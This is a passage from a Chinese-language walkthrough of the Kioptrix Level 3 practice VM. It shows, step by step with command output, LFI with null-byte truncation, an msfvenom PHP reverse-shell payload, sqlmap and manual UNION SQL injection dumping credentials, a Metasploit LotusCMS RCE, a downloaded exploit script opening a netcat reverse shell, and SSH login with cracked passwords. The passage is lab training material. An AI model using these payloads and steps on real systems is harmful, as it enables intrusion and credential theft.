ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   1024 30:e3:f6:dc:2e:22:5d:17:ac:46:02:39:ad:71:cb:49 (DSA)</span><br><span class="line">|_  2048 9a:82:e6:96:e4:7e:d6:a6:d7:45:44:cb:19:aa:ec:dd (RSA)</span><br><span class="line">80/tcp open  http    Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)</span><br><span class="line">| http-cookie-flags: </span><br><span class="line">|   /: </span><br><span class="line">|     PHPSESSID: </span><br><span class="line">|_      httponly flag not set</span><br><span class="line">|_http-server-header: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch</span><br><span class="line">|_http-title: Ligoat Security - Got Goat? Security ...</span><br><span class="line">MAC Address: 00:0C:29:38:2D:6F (VMware)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 2.6.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:2.6</span><br><span class="line">OS details: Linux 2.6.9 - 2.6.33</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.53 ms 192.168.43.158</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 8.91 seconds</span><br></pre></td></tr></table></figure><p>由扫描信息可以得到</p><ul><li>22/tcp open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)</li><li>80/tcp open  http    Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)</li><li>OS details: Linux 2.6.9 - 2.6.33</li></ul><p>80端口可以看出cms为<code>Lotus CMS</code>。</p><p><img src="http://obr4sfdq7.bkt.clouddn.com/kioptrix_3_4.png" alt=""></p><p>用<code>dirb</code>扫描一下网站目录。也可以用御剑扫描目录。发现存在<code>phpdamin</code></p><p><img src="http://obr4sfdq7.bkt.clouddn.com/kioptrix_3_5.png" alt=""></p><p>cms后台<code>http://192.168.43.158/index.php?system=Admin</code></p><p><img src="http://obr4sfdq7.bkt.clouddn.com/kioptrix_3_6.png" alt=""></p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="文件包含-amp-后台上传"><a href="#文件包含-amp-后台上传" class="headerlink" title="文件包含&amp;后台上传"></a>文件包含&amp;后台上传</h3><p>访问80端口上的WEB服务。</p><p><img src="http://obr4sfdq7.bkt.clouddn.com/kioptrix_3_1.png" alt=""></p><p>发现url中有点问题</p><p><code>http://192.168.43.158/index.php?system=Blog</code></p><p>尝试<code>system=../../../../../etc/passwd</code></p><p><img src="http://obr4sfdq7.bkt.clouddn.com/kioptrix_3_2.png" alt=""></p><p>好像不行，尝试<code>%00.</code>截断，发现可以读到<code>/etc/passwd</code></p><p><code>http://192.168.43.158/index.php?system=../../../../../../../../etc/passwd%00.</code></p><p><img src="http://obr4sfdq7.bkt.clouddn.com/kioptrix_3_3.png" alt=""></p><p>这里可以结合后面SQLmap跑出来的后台密码得到了一个shell。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.43.177 LPORT=443 -f raw &gt; /tmp/evil.jpg</span><br><span class="line">No platform was selected, choosing Msf::Module::Platform::PHP from the payload</span><br><span class="line">No Arch selected, selecting Arch: php from the payload</span><br><span class="line">No encoder or badchars specified, outputting raw payload</span><br><span class="line">Payload size: 1114 bytes</span><br></pre></td></tr></table></figure><p>用<code>msfvenom</code>生成一个图片马</p><p>我们在后台上传图片的地方上传一个图片</p><p>修改已有的图片，并得到图片的名，</p><p>利用msf监听端口</p><p>利用文件包含，包含上传图片，这个地方比较鸡肋。因为这个绝对路径我们是得不到的。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://kioptrix3.com/index.php?system=../../../../../../../home/www/kioptrix3.com/gallery/photos/thumb_1a2o44437j.jpg%00.</span><br></pre></td></tr></table></figure><p>访问返回一个shell。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use multi/handler</span><br><span class="line">msf exploit(multi/handler) &gt; set PAYLOAD php/meterpreter/reverse_tcp</span><br><span class="line">PAYLOAD =&gt; php/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(multi/handler) &gt; set LHOST 192.168.43.177</span><br><span class="line">LHOST =&gt; 192.168.43.177</span><br><span class="line">msf exploit(multi/handler) &gt; set LPORT 443</span><br><span class="line">LPORT =&gt; 443</span><br><span class="line">msf exploit(multi/handler) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.43.177:443 </span><br><span class="line">[*] Sending stage (37775 bytes) to 192.168.43.158</span><br><span class="line">[*] Meterpreter session 1 opened (192.168.43.177:443 -&gt; 192.168.43.158:51226) at 2018-05-08 12:53:09 -0400</span><br><span class="line"></span><br><span class="line">meterpreter &gt; ls</span><br><span class="line">Listing: /home/www/kioptrix3.com</span><br><span class="line">================================</span><br><span class="line"></span><br><span class="line">Mode              Size   Type  Last modified              Name</span><br><span class="line">----              ----   ----  -------------              ----</span><br><span class="line">40777/rwxrwxrwx   4096   dir   2011-04-15 09:21:17 -0400  cache</span><br><span class="line">40777/rwxrwxrwx   4096   dir   2011-04-14 12:24:17 -0400  core</span><br><span class="line">40777/rwxrwxrwx   4096   dir   2011-04-14 12:24:17 -0400  data</span><br><span class="line">100644/rw-r--r--  23126  fil   2011-04-14 12:23:13 -0400  favicon.ico</span><br><span class="line">40755/rwxr-xr-x   4096   dir   2011-04-14 11:32:31 -0400  gallery</span><br><span class="line">100644/rw-r--r--  26430  fil   2011-04-14 12:23:13 -0400  gnu-lgpl.txt</span><br><span class="line">100644/rw-r--r--  399    fil   2011-04-14 12:23:13 -0400  index.php</span><br><span class="line">40777/rwxrwxrwx   4096   dir   2011-04-14 12:24:17 -0400  modules</span><br><span class="line">40777/rwxrwxrwx   4096   dir   2011-04-14 12:24:17 -0400  style</span><br><span class="line">100644/rw-r--r--  243    fil   2011-04-14 12:23:13 -0400  update.php</span><br></pre></td></tr></table></figure><p>权限有点小，很多命令都执行不了的。</p><h3 id="SQLmap进行SQL注入"><a href="#SQLmap进行SQL注入" class="headerlink" title="SQLmap进行SQL注入"></a>SQLmap进行SQL注入</h3><p>这个站是有的链接有问题，302跳转到<code>kioptrix3.com</code></p><p>在<code>etc/passwd</code>添加</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.43.158  kioptrix3.com</span><br></pre></td></tr></table></figure><p><code>service networking restart</code>重启服务</p><p>发现url存在SQL注入。<code>kioptrix3.com/gallery/gallery.php?id=1&amp;sort=photoid#photos</code></p><p><img src="http://obr4sfdq7.bkt.clouddn.com/kioptrix_3_7.png" alt=""></p><p>先用<code>sqlmap</code>进行注入测试，id存在报错注入。</p><p><img src="http://obr4sfdq7.bkt.clouddn.com/kioptrix_3_8.png" alt=""></p><p>尝试查找下后台管理员账号密码。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Database: gallery                                                                              </span><br><span class="line">Table: dev_accounts</span><br><span class="line">[2 entries]</span><br><span class="line">+----+------------+---------------------------------------------+</span><br><span class="line">| id | username   | password                                    |</span><br><span class="line">+----+------------+---------------------------------------------+</span><br><span class="line">| 1  | dreg       | 0d3eccfb887aabd50f243b3f155c0f85 (Mast3r)   |</span><br><span class="line">| 2  | loneferret | 5badcaf789d3d1d09794d8f021f40f0e (starwars) |</span><br><span class="line">+----+------------+---------------------------------------------+</span><br></pre></td></tr></table></figure><p>得到管理员账号密码，但是在</p><p><img src="http://obr4sfdq7.bkt.clouddn.com/kioptrix_3_6.png" alt=""></p><p>无法登录，另外找到一个登录的地方<code>http://kioptrix3.com/gallery/gadmin/</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Database: gallery</span><br><span class="line">Table: gallarific_users</span><br><span class="line">[2 entries]</span><br><span class="line">+----------+----------+</span><br><span class="line">| username | password |</span><br><span class="line">+----------+----------+</span><br><span class="line">| admin    | n0t7t1k4 |</span><br><span class="line">+----------+----------+</span><br></pre></td></tr></table></figure><p>但是可以登录。</p><p>这里虽然可以是<code>root</code>和<code>dba</code>权限，但是没有绝对路径。不能直接用sqlmap进行写shell。</p><h3 id="手注sqli"><a href="#手注sqli" class="headerlink" title="手注sqli"></a>手注sqli</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://kioptrix3.com/gallery/gallery.php?id=1%20union%20select%201,2,3,4,5,6#</span><br></pre></td></tr></table></figure><p>判断一共有6列</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://kioptrix3.com/gallery/gallery.php?id=1%20union%20select%201,version(),database(),4,5,6#</span><br></pre></td></tr></table></figure><p><img src="http://obr4sfdq7.bkt.clouddn.com/kioptrix_3_9.png" alt=""></p><p>得到当前数据库和版本号</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://kioptrix3.com/gallery/gallery.php?id=1%20union%20select%201,group_concat(table_name),3,4,5,6%20from%20information_schema.tables%20where%20table_schema%20=%20database()#</span><br></pre></td></tr></table></figure><p><img src="http://obr4sfdq7.bkt.clouddn.com/kioptrix_3_10.png" alt=""></p><p>得到当前数据库所有的表名。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://kioptrix3.com/gallery/gallery.php?id=1%20union%20select%201,group_concat(column_name),3,4,5,6%20FROM%20information_schema.columns%20WHERE%20table_name%20=0x6465765f6163636f756e7473#</span><br></pre></td></tr></table></figure><p><img src="http://obr4sfdq7.bkt.clouddn.com/kioptrix_3_11.png" alt=""></p><p>获取表里的列名。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://kioptrix3.com/gallery/gallery.php?id=1%20union%20select%201,group_concat(username,0x3a,password),3,4,5,6%20FROM%20dev_accounts#</span><br></pre></td></tr></table></figure><p><img src="http://obr4sfdq7.bkt.clouddn.com/kioptrix_3_12.png" alt=""></p><h3 id="Lotus-CMS-漏洞"><a href="#Lotus-CMS-漏洞" class="headerlink" title="Lotus CMS 漏洞"></a>Lotus CMS 漏洞</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# searchsploit Lotus CMS</span><br><span class="line">------------------------------------------------------- ----------------------------------------</span><br><span class="line"> Exploit Title                                         |  Path</span><br><span class="line">                                                       | (/usr/share/exploitdb/)</span><br><span class="line">------------------------------------------------------- ----------------------------------------</span><br><span class="line">Lotus CMS Fraise 3.0 - Local File Inclusion / Remote C | exploits/php/webapps/15964.py</span><br><span class="line">Lotus Core CMS 1.0.1 - Remote File Inclusion           | exploits/php/webapps/5866.txt</span><br><span class="line">LotusCMS 3.0 - &apos;eval()&apos; Remote Command Execution (Meta | exploits/php/remote/18565.rb</span><br><span class="line">LotusCMS 3.0.3 - Multiple Vulnerabilities              | exploits/php/webapps/16982.txt</span><br><span class="line">------------------------------------------------------- ----------------------------------------</span><br><span class="line">Shellcodes: No Result</span><br></pre></td></tr></table></figure><p>从查询结果看，有一个本地文件包含和一个远程代码执行，</p><p>这里的本地文件包含就是我们之前发现的那个。我们尝试下这个本地文件包含漏洞</p><p>尝试发现这个漏洞好像不行。</p><p>尝试<code>LotusCMS 3.0 - &#39;eval()&#39; Remote Command Execution</code> 发现是一个rb文件。</p><p>于是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; search LotusCMS</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   Name                              Disclosure Date  Rank       Description</span><br><span class="line">   ----                              ---------------  ----       -----------</span><br><span class="line">   exploit/multi/http/lcms_php_exec  2011-03-03       excellent  LotusCMS 3.0 eval() Remote Command Execution</span><br></pre></td></tr></table></figure><p>利用这个漏洞进行攻击</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/multi/http/lcms_php_exec </span><br><span class="line">msf exploit(multi/http/lcms_php_exec) &gt; show options </span><br><span class="line"></span><br><span class="line">Module options (exploit/multi/http/lcms_php_exec):</span><br><span class="line"></span><br><span class="line">   Name     Current Setting  Required  Description</span><br><span class="line">   ----     ---------------  --------  -----------</span><br><span class="line">   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]</span><br><span class="line">   RHOST                     yes       The target address</span><br><span class="line">   RPORT    80               yes       The target port (TCP)</span><br><span class="line">   SSL      false            no        Negotiate SSL/TLS for outgoing connections</span><br><span class="line">   URI      /lcms/           yes       URI</span><br><span class="line">   VHOST                     no        HTTP server virtual host</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic LotusCMS 3.0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf exploit(multi/http/lcms_php_exec) &gt; set RHOST 192.168.43.58</span><br><span class="line">RHOST =&gt; 192.168.43.58</span><br><span class="line">msf exploit(multi/http/lcms_php_exec) &gt; set PAYLOAD generic/shell_bind_tcp </span><br><span class="line">PAYLOAD =&gt; generic/shell_bind_tcp</span><br><span class="line">msf exploit(multi/http/lcms_php_exec) &gt; set URI /</span><br><span class="line">URi =&gt; /</span><br><span class="line">msf exploit(multi/http/lcms_php_exec) &gt; show options </span><br><span class="line"></span><br><span class="line">Module options (exploit/multi/http/lcms_php_exec):</span><br><span class="line"></span><br><span class="line">   Name     Current Setting  Required  Description</span><br><span class="line">   ----     ---------------  --------  -----------</span><br><span class="line">   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]</span><br><span class="line">   RHOST    192.168.43.58    yes       The target address</span><br><span class="line">   RPORT    80               yes       The target port (TCP)</span><br><span class="line">   SSL      false            no        Negotiate SSL/TLS for outgoing connections</span><br><span class="line">   URI      /                yes       URI</span><br><span class="line">   VHOST                     no        HTTP server virtual host</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (generic/shell_bind_tcp):</span><br><span class="line"></span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   ----   ---------------  --------  -----------</span><br><span class="line">   LPORT  4444             yes       The listen port</span><br><span class="line">   RHOST  192.168.43.58    no        The target address</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic LotusCMS 3.0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf exploit(multi/http/lcms_php_exec) &gt; run </span><br><span class="line"></span><br><span class="line">[*] Started bind handler</span><br><span class="line">[-] Exploit failed [unreachable]: Rex::HostUnreachable The host (192.168.43.58:80) was unreachable.</span><br><span class="line">[*] Exploit completed, but no session was created.</span><br><span class="line">msf exploit(multi/http/lcms_php_exec) &gt; set RHOST 192.168.43.158</span><br><span class="line">RHOST =&gt; 192.168.43.158</span><br><span class="line">msf exploit(multi/http/lcms_php_exec) &gt; run </span><br><span class="line"></span><br><span class="line">[*] Started bind handler</span><br><span class="line">[*] Using found page param: /index.php?page=index</span><br><span class="line">[*] Sending exploit ...</span><br><span class="line">[*] Command shell session 1 opened (192.168.43.177:44505 -&gt; 192.168.43.158:4444) at 2018-05-08 10:02:56 -0400</span><br><span class="line"></span><br><span class="line">whoami</span><br><span class="line">www-data</span><br><span class="line">id</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="line">ls</span><br><span class="line">cache</span><br><span class="line">core</span><br><span class="line">data</span><br><span class="line">favicon.ico</span><br><span class="line">gallery</span><br><span class="line">gnu-lgpl.txt</span><br><span class="line">index.php</span><br><span class="line">modules</span><br><span class="line">style</span><br><span class="line">update.php</span><br><span class="line">pwd </span><br><span class="line">/home/www/kioptrix3.com</span><br></pre></td></tr></table></figure><p>我尝试用<code>cd</code>命令进入<code>gallery</code>目录但是不行，</p><p>这里用到<code>ls -l</code>可以看到<code>gallery</code>目录的文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">ls -l gallery</span><br><span class="line">total 156</span><br><span class="line">drwxr-xr-x 2 root root  4096 Apr 12  2011 BACK</span><br><span class="line">-rw-r--r-- 1 root root  3573 Oct 10  2009 db.sql</span><br><span class="line">-rw-r--r-- 1 root root   252 Apr 12  2011 g.php</span><br><span class="line">drwxr-xr-x 3 root root  4096 Apr 12  2011 gadmin</span><br><span class="line">-rw-r--r-- 1 root root   214 Apr 12  2011 gallery.php</span><br><span class="line">-rw-r--r-- 1 root root  1440 Apr 14  2011 gconfig.php</span><br><span class="line">-rw-r--r-- 1 root root   297 Apr 12  2011 gfooter.php</span><br><span class="line">-rw-r--r-- 1 root root 38771 Apr 12  2011 gfunctions.php</span><br><span class="line">-rw-r--r-- 1 root root  1009 Apr 12  2011 gheader.php</span><br><span class="line">-rw-r--r-- 1 root root   249 Apr 12  2011 index.php</span><br><span class="line">-rw-r--r-- 1 root root 10340 Apr 12  2011 install.BAK</span><br><span class="line">-rw-r--r-- 1 root root   212 Apr 12  2011 login.php</span><br><span class="line">-rw-r--r-- 1 root root   213 Apr 12  2011 logout.php</span><br><span class="line">-rw-r--r-- 1 root root   249 Apr 12  2011 p.php</span><br><span class="line">drwxrwxrwx 2 root root  4096 Apr 12  2011 photos</span><br><span class="line">-rw-r--r-- 1 root root   213 Apr 12  2011 photos.php</span><br><span class="line">-rw-r--r-- 1 root root   219 Apr 12  2011 post_comment.php</span><br><span class="line">-rw-r--r-- 1 root root   214 Apr 12  2011 profile.php</span><br><span class="line">-rw-r--r-- 1 root root    87 Oct 10  2009 readme.html</span><br><span class="line">-rw-r--r-- 1 root root   213 Apr 12  2011 recent.php</span><br><span class="line">-rw-r--r-- 1 root root   215 Apr 12  2011 register.php</span><br><span class="line">drwxr-xr-x 2 root root  4096 Apr 13  2011 scopbin</span><br><span class="line">-rw-r--r-- 1 root root   213 Apr 12  2011 search.php</span><br><span class="line">-rw-r--r-- 1 root root   216 Apr 12  2011 slideshow.php</span><br><span class="line">-rw-r--r-- 1 root root   211 Apr 12  2011 tags.php</span><br><span class="line">drwxr-xr-x 6 root root  4096 Apr 12  2011 themes</span><br><span class="line">-rw-r--r-- 1 root root    56 Oct 10  2009 version.txt</span><br><span class="line">-rw-r--r-- 1 root root   211 Apr 12  2011 vote.php</span><br></pre></td></tr></table></figure><p>发现<code>gconfig.php</code>配置文件，<code>cat</code>读配置文件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">$GLOBALS[&quot;gallarific_path&quot;] = &quot;http://kioptrix3.com/gallery&quot;;</span><br><span class="line"></span><br><span class="line">$GLOBALS[&quot;gallarific_mysql_server&quot;] = &quot;localhost&quot;;</span><br><span class="line">$GLOBALS[&quot;gallarific_mysql_database&quot;] = &quot;gallery&quot;;</span><br><span class="line">$GLOBALS[&quot;gallarific_mysql_username&quot;] = &quot;root&quot;;</span><br><span class="line">$GLOBALS[&quot;gallarific_mysql_password&quot;] = &quot;fuckeyou&quot;;</span><br></pre></td></tr></table></figure><h3 id="lotusRCE-sh"><a href="#lotusRCE-sh" class="headerlink" title="lotusRCE.sh"></a>lotusRCE.sh</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://raw.githubusercontent.com/Hood3dRob1n/LotusCMS-Exploit/master/lotusRCE.sh</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# chmod +x lotusRCE.sh</span><br><span class="line">root@kali:~# ./lotusRCE.sh 192.168.43.158</span><br><span class="line"></span><br><span class="line">Path found, now to check for vuln....</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;Hood3dRob1n</span><br><span class="line">Regex found, site is vulnerable to PHP Code Injection!</span><br><span class="line"></span><br><span class="line">About to try and inject reverse shell....</span><br><span class="line">what IP to use?</span><br><span class="line">192.168.43.177</span><br><span class="line">What PORT?</span><br><span class="line">2333</span><br><span class="line"></span><br><span class="line">OK, open your local listener and choose the method for back connect: </span><br><span class="line">1) NetCat -e    3) NetCat Backpipe5) Exit</span><br><span class="line">2) NetCat /dev/tcp  4) NetCat FIFO</span><br><span class="line">#? 1</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@kali:/tmp# nc -lvp 2333</span><br><span class="line">listening on [any] 2333 ...</span><br><span class="line">connect to [192.168.43.177] from kioptrix3.com [192.168.43.158] 56259</span><br><span class="line">whoami</span><br><span class="line">www-data</span><br><span class="line">id</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br></pre></td></tr></table></figure><h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>尝试用之前SQL注入得到的。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Database: gallery                                                                              </span><br><span class="line">Table: dev_accounts</span><br><span class="line">[2 entries]</span><br><span class="line">+----+------------+---------------------------------------------+</span><br><span class="line">| id | username   | password                                    |</span><br><span class="line">+----+------------+---------------------------------------------+</span><br><span class="line">| 1  | dreg       | 0d3eccfb887aabd50f243b3f155c0f85 (Mast3r)   |</span><br><span class="line">| 2  | loneferret | 5badcaf789d3d1d09794d8f021f40f0e (starwars) |</span><br><span class="line">+----+------------+---------------------------------------------+</span><br></pre></td></tr></table></figure></p><p>进行SSH连接，发现第一个账号不能没有多大的作用，不能提权。</p><p>连接第二个账号</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# ssh loneferret@192.168.43.158</span><br><span class="line">loneferret@192.168.43.158&apos;s password: </span><br><span class="line">Linux Kioptrix3 2.6.24-24-server #1 SMP Tue Jul 7 20:21:17 UTC 2009 i686</span><br><span class="line"></span><br><span class="line">The programs included with the Ubuntu system are free software;</span><br><span class="line">the exact distribution terms for each program are described in the</span><br><span class="line">individual files in /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by</span><br><span class="line">applicable law.</span><br><span class="line"></span><br><span class="line">To access official Ubuntu documentation, please visit:</span><br><span class="line">http://help.ubuntu.com/</span><br><span class="line">Last login: Sat Apr 16 08:51:58 2011 from 192.168.1.106</span><br><span class="line">loneferret@Kioptrix3:~$ ls</span><br><span class="line">checksec.sh  CompanyPolicy.README</span><br></pre></td></tr></table></figure><p>存在一个<code>CompanyPolicy.README</code>文件.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">checksec.sh  CompanyPolicy.README</span><br><span class="line">loneferret@Kioptrix3:~$ cat CompanyPolicy.README </span><br><span class="line">Hello new employee,</span><br><span class="line">It is company policy here to use our newly installed software for editing, creating and viewing files.</span><br><span class="line">Please use the command &apos;sudo ht&apos;.</span><br><span class="line">Failure to do so will result in you immediate termination.</span><br><span class="line"></span><br><span class="line">DG</span><br><span 